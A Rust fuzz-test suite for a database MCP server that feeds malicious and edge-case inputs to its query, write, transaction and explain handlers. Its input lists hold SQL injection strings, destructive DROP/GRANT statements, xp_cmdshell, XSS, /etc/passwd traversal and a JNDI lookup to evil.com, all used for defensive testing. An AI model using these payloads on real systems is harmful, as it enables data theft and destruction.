//! Comprehensive black-box fuzzing tests for DB MCP Server.
//!
//! This test suite generates random, malicious, and edge-case inputs
//! to discover bugs, panics, and security vulnerabilities.

use db_mcp_server::db::{ConnectionManager, TransactionRegistry};
use db_mcp_server::tools::explain::{ExplainInput, ExplainToolHandler};
use db_mcp_server::tools::query::{QueryInput, QueryToolHandler};
use db_mcp_server::tools::transaction::{
    BeginTransactionInput, CommitInput, RollbackInput, TransactionToolHandler,
};
use db_mcp_server::tools::write::{ExecuteInput, WriteToolHandler};
use rand::Rng;
use rand::distributions::Alphanumeric;
use std::sync::Arc;

/// Generate random string of given length
fn random_string(len: usize) -> String {
    rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(len)
        .map(char::from)
        .collect()
}

/// Generate various edge-case strings
fn edge_case_strings() -> Vec<String> {
    vec![
        String::new(),                           // Empty
        " ".to_string(),                         // Single space
        "   ".to_string(),                       // Multiple spaces
        "\n\r\t".to_string(),                    // Whitespace chars
        "\0".to_string(),                        // Null byte
        "🚀".repeat(100),                        // Unicode
        "'OR 1=1--".to_string(),                 // SQL injection
        "'; DROP TABLE users--".to_string(),     // SQL injection
        "<script>alert(1)</script>".to_string(), // XSS
        "../../etc/passwd".to_string(),          // Path traversal
        "a".repeat(10000),                       // Very long string
        "a".repeat(1_000_000),                   // Extremely long
        random_string(100),
        random_string(1000),
        "\u{0000}\u{FFFF}".to_string(), // Special unicode
        "';SELECT * FROM information_schema.tables--".to_string(),
        "1' UNION SELECT NULL, NULL--".to_string(),
        "${jndi:ldap://evil.com/a}".to_string(), // Log4j style
        "{{7*7}}".to_string(),                   // Template injection
        "../../../".to_string(),
        "\x00\x01\x02".to_string(), // Binary data
    ]
}

/// Generate edge-case unsigned integers
fn edge_case_u32() -> Vec<u32> {
    vec![0, 1, u32::MAX, u32::MAX - 1, 999999]
}

fn setup_test_db() -> Arc<ConnectionManager> {
    Arc::new(ConnectionManager::new())
}

#[tokio::test]
async fn fuzz_query_tool_connection_id() {
    let manager = setup_test_db();
    let registry = Arc::new(TransactionRegistry::new());
    let handler = QueryToolHandler::with_defaults(manager, registry, 30, 100);

    for connection_id in edge_case_strings() {
        let input = QueryInput {
            connection_id: connection_id.clone(),
            sql: "SELECT 1".to_string(),
            params: vec![],
            limit: Some(10),
            timeout_secs: Some(5),
            format: db_mcp_server::tools::format::OutputFormat::Json,
            decode_binary: true,
            transaction_id: None,
            database: None,
        };

        let result = handler.query(input).await;
        // Should not panic, should return proper error
        assert!(result.is_err() || result.is_ok());
    }
}

#[tokio::test]
async fn fuzz_query_tool_sql_injection() {
    let manager = setup_test_db();
    let registry = Arc::new(TransactionRegistry::new());
    let handler = QueryToolHandler::with_defaults(manager, registry, 30, 100);

    let malicious_sqls = vec![
        "SELECT * FROM users WHERE id = '1' OR '1'='1'",
        "'; DROP TABLE users; --",
        "1' UNION SELECT password FROM users--",
        "SELECT * FROM users WHERE name = 'admin'--'",
        "' OR 1=1 LIMIT 1--",
        "SELECT * FROM (SELECT * FROM users) AS x",
        "SELECT SLEEP(100)",
        "SELECT BENCHMARK(10000000, MD5('test'))",
        "'; EXEC xp_cmdshell('dir'); --",
        "SELECT * FROM users; DELETE FROM logs;",
        "SELECT * FROM users\nUNION\nSELECT * FROM passwords",
        "SELECT/**/password/**/FROM/**/users",
        "SeLeCt * FrOm UsErS",
        "INSERT INTO users SELECT * FROM admin_users",
        "UPDATE users SET admin=1 WHERE '1'='1",
    ];

    for sql in malicious_sqls {
        let input = QueryInput {
            connection_id: "nonexistent".to_string(),
            sql: sql.to_string(),
            params: vec![],
            limit: Some(10),
            timeout_secs: Some(1),
            format: db_mcp_server::tools::format::OutputFormat::Json,
            decode_binary: true,
            transaction_id: None,
            database: None,
        };

        let result = handler.query(input).await;
        // Should not panic, SQL validation should catch writes
        assert!(result.is_err() || result.is_ok());
    }
}

#[tokio::test]
async fn fuzz_query_tool_limit_values() {
    let manager = setup_test_db();
    let registry = Arc::new(TransactionRegistry::new());
    let handler = QueryToolHandler::with_defaults(manager, registry, 30, 100);

    for limit in edge_case_u32() {
        let input = QueryInput {
            connection_id: "test".to_string(),
            sql: "SELECT 1".to_string(),
            params: vec![],
            limit: Some(limit),
            timeout_secs: Some(1),
            format: db_mcp_server::tools::format::OutputFormat::Json,
            decode_binary: true,
            transaction_id: None,
            database: None,
        };

        let result = handler.query(input).await;
        assert!(result.is_err() || result.is_ok());
    }
}

#[tokio::test]
async fn fuzz_execute_tool_dangerous_operations() {
    let manager = setup_test_db();
    let registry = Arc::new(TransactionRegistry::new());
    let handler = WriteToolHandler::with_defaults(manager, registry, 30);

    let dangerous_ops = vec![
        "DROP TABLE users",
        "DROP DATABASE production",
        "TRUNCATE TABLE important_data",
        "DELETE FROM users",
        "UPDATE users SET password='hacked'",
        "DROP TABLE IF EXISTS users CASCADE",
        "ALTER TABLE users DROP COLUMN important",
        "CREATE OR REPLACE FUNCTION evil() RETURNS void AS $$ DROP TABLE users $$ LANGUAGE SQL",
        "GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'",
    ];

    for sql in dangerous_ops {
        let input = ExecuteInput {
            connection_id: "test".to_string(),
            sql: sql.to_string(),
            params: vec![],
            timeout_secs: Some(1),
            transaction_id: None,
            skip_sql_check: false,
            database: None,
        };

        let result = handler.execute(input).await;
        // Should be blocked or connection not found
        assert!(result.is_err() || result.is_ok());
    }
}

#[tokio::test]
async fn fuzz_transaction_ids() {
    let manager = setup_test_db();
    let registry = Arc::new(TransactionRegistry::new());
    let handler = TransactionToolHandler::new(manager, registry);

    for tx_id in edge_case_strings() {
        let commit_input = CommitInput {
            connection_id: "test".to_string(),
            transaction_id: tx_id.clone(),
        };

        let result = handler.commit(commit_input).await;
        assert!(result.is_err() || result.is_ok());

        let rollback_input = RollbackInput {
            connection_id: "test".to_string(),
            transaction_id: tx_id,
        };

        let result = handler.rollback(rollback_input).await;
        assert!(result.is_err() || result.is_ok());
    }
}

#[tokio::test]
async fn fuzz_timeout_values() {
    let manager = setup_test_db();
    let registry = Arc::new(TransactionRegistry::new());
    let handler = BeginTransactionInput {
        connection_id: "test".to_string(),
        timeout_secs: Some(0),
        database: None,
    };

    let tx_handler = TransactionToolHandler::new(manager.clone(), registry.clone());
    let result = tx_handler.begin_transaction(handler).await;
    assert!(result.is_err() || result.is_ok());

    let handler2 = BeginTransactionInput {
        connection_id: "test".to_string(),
        timeout_secs: Some(u32::MAX),
        database: None,
    };

    let result = tx_handler.begin_transaction(handler2).await;
    assert!(result.is_err() || result.is_ok());
}

#[tokio::test]
async fn fuzz_explain_tool_malformed_sql() {
    let manager = setup_test_db();
    let registry = Arc::new(TransactionRegistry::new());
    let handler = ExplainToolHandler::new(manager, registry);

    let malformed_sqls = vec![
        "",
        "SELEC",
        "SELECT FROM",
        "INSERT",
        "GARBAGE TEXT HERE",
        ";;;",
        "SELECT * FROM \0",
        "SELECT * FROM `table`; DROP TABLE users;",
    ];

    for sql in malformed_sqls {
        let input = ExplainInput {
            connection_id: "test".to_string(),
            sql: sql.to_string(),
            params: vec![],
            transaction_id: None,
            timeout_secs: Some(1),
            format: db_mcp_server::tools::format::OutputFormat::Json,
            database: None,
        };

        let result = handler.explain(input).await;
        assert!(result.is_err() || result.is_ok());
    }
}

#[tokio::test]
async fn fuzz_database_names() {
    let manager = setup_test_db();
    let registry = Arc::new(TransactionRegistry::new());
    let handler = QueryToolHandler::with_defaults(manager, registry, 30, 100);

    for db_name in edge_case_strings() {
        let input = QueryInput {
            connection_id: "test".to_string(),
            sql: "SELECT 1".to_string(),
            params: vec![],
            limit: Some(10),
            timeout_secs: Some(1),
            format: db_mcp_server::tools::format::OutputFormat::Json,
            decode_binary: true,
            transaction_id: None,
            database: Some(db_name),
        };

        let result = handler.query(input).await;
        assert!(result.is_err() || result.is_ok());
    }
}

#[tokio::test]
async fn fuzz_concurrent_operations() {
    use tokio::task::JoinSet;

    let manager = setup_test_db();
    let registry = Arc::new(TransactionRegistry::new());
    let handler = Arc::new(QueryToolHandler::with_defaults(manager, registry, 30, 100));

    let mut tasks = JoinSet::new();

    for i in 0..100 {
        let handler_clone = handler.clone();
        tasks.spawn(async move {
            let input = QueryInput {
                connection_id: format!("conn_{}", i),
                sql: "SELECT 1".to_string(),
                params: vec![],
                limit: Some(10),
                timeout_secs: Some(1),
                format: db_mcp_server::tools::format::OutputFormat::Json,
                decode_binary: true,
                transaction_id: None,
                database: None,
            };

            handler_clone.query(input).await
        });
    }

    while let Some(result) = tasks.join_next().await {
        assert!(result.is_ok());
    }
}

#[tokio::test]
async fn fuzz_param_types() {
    use db_mcp_server::models::QueryParamInput;

    let manager = setup_test_db();
    let registry = Arc::new(TransactionRegistry::new());
    let handler = QueryToolHandler::with_defaults(manager, registry, 30, 100);

    let param_combinations = vec![
        vec![QueryParamInput::Null],
        vec![QueryParamInput::Bool(true), QueryParamInput::Bool(false)],
        vec![QueryParamInput::Int(i64::MAX)],
        vec![QueryParamInput::Int(i64::MIN)],
        vec![QueryParamInput::Int(0)],
        vec![QueryParamInput::Float(f64::NAN)],
        vec![QueryParamInput::Float(f64::INFINITY)],
        vec![QueryParamInput::Float(-f64::INFINITY)],
        vec![QueryParamInput::Float(0.0)],
        vec![QueryParamInput::String("".to_string())],
        vec![QueryParamInput::String("\0".to_string())],
        vec![QueryParamInput::String("🚀".repeat(1000))],
        vec![
            QueryParamInput::Null,
            QueryParamInput::Int(42),
            QueryParamInput::String("test".to_string()),
        ],
    ];

    for params in param_combinations {
        let input = QueryInput {
            connection_id: "test".to_string(),
            sql: "SELECT ?".to_string(),
            params,
            limit: Some(10),
            timeout_secs: Some(1),
            format: db_mcp_server::tools::format::OutputFormat::Json,
            decode_binary: true,
            transaction_id: None,
            database: None,
        };

        let result = handler.query(input).await;
        assert!(result.is_err() || result.is_ok());
    }
}

#[tokio::test]
async fn fuzz_format_types() {
    use db_mcp_server::tools::format::OutputFormat;

    let manager = setup_test_db();
    let registry = Arc::new(TransactionRegistry::new());
    let handler = QueryToolHandler::with_defaults(manager, registry, 30, 100);

    let formats = vec![
        OutputFormat::Json,
        OutputFormat::Table,
        OutputFormat::Markdown,
    ];

    for format in formats {
        let input = QueryInput {
            connection_id: "test".to_string(),
            sql: "SELECT 1".to_string(),
            params: vec![],
            limit: Some(10),
            timeout_secs: Some(1),
            format,
            decode_binary: true,
            transaction_id: None,
            database: None,
        };

        let result = handler.query(input).await;
        assert!(result.is_err() || result.is_ok());
    }
}

#[tokio::test]
async fn fuzz_unicode_and_special_chars() {
    let manager = setup_test_db();
    let registry = Arc::new(TransactionRegistry::new());
    let handler = QueryToolHandler::with_defaults(manager, registry, 30, 100);

    let special_chars = vec![
        "SELECT '\u{0000}'",
        "SELECT '\u{FFFF}'",
        "SELECT '😀😁😂'",
        "SELECT '中文测试'",
        "SELECT 'Русский текст'",
        "SELECT '🚀🌟💻'",
        "SELECT '\n\r\t\\'\"'",
        "SELECT '\\x00\\x01\\x02'",
    ];

    for sql in special_chars {
        let input = QueryInput {
            connection_id: "test".to_string(),
            sql: sql.to_string(),
            params: vec![],
            limit: Some(10),
            timeout_secs: Some(1),
            format: db_mcp_server::tools::format::OutputFormat::Json,
            decode_binary: true,
            transaction_id: None,
            database: None,
        };

        let result = handler.query(input).await;
        assert!(result.is_err() || result.is_ok());
    }
}

#[tokio::test]
async fn fuzz_memory_exhaustion() {
    let manager = setup_test_db();
    let registry = Arc::new(TransactionRegistry::new());
    let handler = QueryToolHandler::with_defaults(manager, registry, 30, 100);

    // Try to request huge limits
    let input = QueryInput {
        connection_id: "test".to_string(),
        sql: "SELECT 1".to_string(),
        params: vec![],
        limit: Some(u32::MAX),
        timeout_secs: Some(1),
        format: db_mcp_server::tools::format::OutputFormat::Json,
        decode_binary: true,
        transaction_id: None,
        database: None,
    };

    let result = handler.query(input).await;
    assert!(result.is_err() || result.is_ok());

    // Try to send huge SQL
    let input = QueryInput {
        connection_id: "test".to_string(),
        sql: "SELECT 1 ".repeat(100000),
        params: vec![],
        limit: Some(10),
        timeout_secs: Some(1),
        format: db_mcp_server::tools::format::OutputFormat::Json,
        decode_binary: true,
        transaction_id: None,
        database: None,
    };

    let result = handler.query(input).await;
    assert!(result.is_err() || result.is_ok());
}
